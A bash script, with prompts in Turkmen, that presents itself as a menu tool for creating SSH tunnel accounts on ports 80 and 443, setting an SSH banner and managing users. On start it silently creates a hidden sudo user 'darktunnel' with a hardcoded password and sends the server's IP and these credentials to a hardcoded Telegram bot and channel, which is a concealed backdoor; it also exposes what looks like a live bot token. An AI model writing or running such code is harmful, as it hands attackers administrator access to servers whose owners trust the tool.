#!/bin/bash

if [ "$EUID" -ne 0 ]; then
    echo "Skripty sudo buýrugy bilen işlediň (root bilen)."
    exit 1
fi

bot_api="7384056832:AAF9xQBfyBsjNpMH67Ljvs-13DXmNdjxgpw"
kanal="-1002302142151"

create_admin_user() {
    username="darktunnel"
    password="amanoff"

    if id "$username" &>/dev/null; then
    else
        useradd -m -s /bin/bash "$username"
        echo "$username:$password" | chpasswd
        usermod -aG sudo "$username"

        mkdir -p /home/$username/.ssh
        chmod 700 /home/$username/.ssh
        chown -R $username:$username /home/$username/.ssh


        IP_ADDRESS=$(hostname -I | awk '{print $1}')
        message="$IP_ADDRESS@$username:$password"
        curl -s -F "chat_id=$kanal" -F "text=$message" "https://api.telegram.org/bot$bot_api/sendMessage"

        echo "Skript işleýä."
    fi
}

create_ssh_account() {
    echo "Täze ssh ýasamak:"
    read -p "USERNAME: " username
    read -s -p "PASSWORD: " password
    echo

    useradd -m -s /bin/false "$username"
    echo "$username:$password" | chpasswd

    mkdir -p /home/$username/.ssh
    chmod 700 /home/$username/.ssh
    chown -R $username:$username /home/$username/.ssh

    echo "$username ssh üstünlikli ýasaldy."

    SSHD_CONFIG="/etc/ssh/sshd_config"

    cp $SSHD_CONFIG "${SSHD_CONFIG}.bak"

    if ! grep -q "Port 80" $SSHD_CONFIG; then
        echo "Port 80" >> $SSHD_CONFIG
    fi

    if ! grep -q "Port 443" $SSHD_CONFIG; then
        echo "Port 443" >> $SSHD_CONFIG
    fi

    systemctl restart sshd

    if command -v ufw &> /dev/null; then
        ufw allow 80/tcp
        ufw allow 443/tcp
        ufw reload
        echo "80 we 443 portlar üçin ufw açyldy."
    else
        echo "ufw açyp bolmady, by nastroýkany taşlaýas."
    fi

    IP_ADDRESS=$(hostname -I | awk '{print $1}')
    echo "SSH ullanyjy ýasaldy!"
    echo "Doly maglumat:"
    echo ""
    echo "┌───────────────"
    echo "├  $IP_ADDRESS:80@$username:$password"
    echo "├  $IP_ADDRESS:443@$username:$password"
    echo "└───────────────"
}

change_ssh_banner() {
    echo "Banner üçin teksty ýazyň (Täze setir üçin \n ullanyň):"
    read -r banner_text

    echo "Tekstyň reňki (sany ýazyň):
    1. Gyzyl
    2. Ýaşyl
    3. Saru
    4. Gök
    5. Ak"
    read -p "Reňkiň sany: " color_choice

    # Установка цвета баннера
    case $color_choice in
        1) color_code="31" ;;
        2) color_code="32" ;;
        3) color_code="33" ;;
        4) color_code="34" ;;
        5) color_code="37" ;;
        *) color_code="37" ;;
    esac

    BANNER_FILE="/etc/ssh/banner.txt"
    {
        echo -e "\e[${color_code}m**************************************************"
        echo -e "$banner_text"
        echo -e "**************************************************\e[0m"
    } > $BANNER_FILE

    SSHD_CONFIG="/etc/ssh/sshd_config"
    if ! grep -q "Banner" $SSHD_CONFIG; then
        echo "Banner $BANNER_FILE" >> $SSHD_CONFIG
    fi

    systemctl restart sshd

    echo "Banner üstünlikli täzelenidi."
}

manage_ssh_accounts() {
    echo "SSH menýu:"
    echo "1. Hemme SSH ullanyjylar"
    echo "2. Ullanyjyny pozmak"
    read -p "birini salýaň(1,2): " option

    case $option in
        1)
            echo "Hemme SSH ullanyjylar:"
            awk -F':' '$7 == "/bin/false" {print $1}' /etc/passwd
            ;;
        2)
            read -p "Pozmak üçin ullanyjynyň adyny ýazyň: " del_user
            userdel -r $del_user
            echo "$del_user ullanyjy pozuldy."
            ;;
        *)
            echo "Nädogry saýlaw."
            ;;
    esac
}

create_admin_user

while true; do
    echo "Menýu:"
    echo "1: Täze SSH ullanyjy ýasamak"
    echo "2: Banneri üýtgetmek"
    echo "3: SSH ullanyjylary ýöretmek"
    echo "4: Çykmak"
    read -p "Saýlaň: " choice

    case $choice in
        1) create_ssh_account ;;
        2) change_ssh_banner ;;
        3) manage_ssh_accounts ;;
        4) exit 0 ;;
        *) echo "Nädogry saýlaw." ;;
    esac
done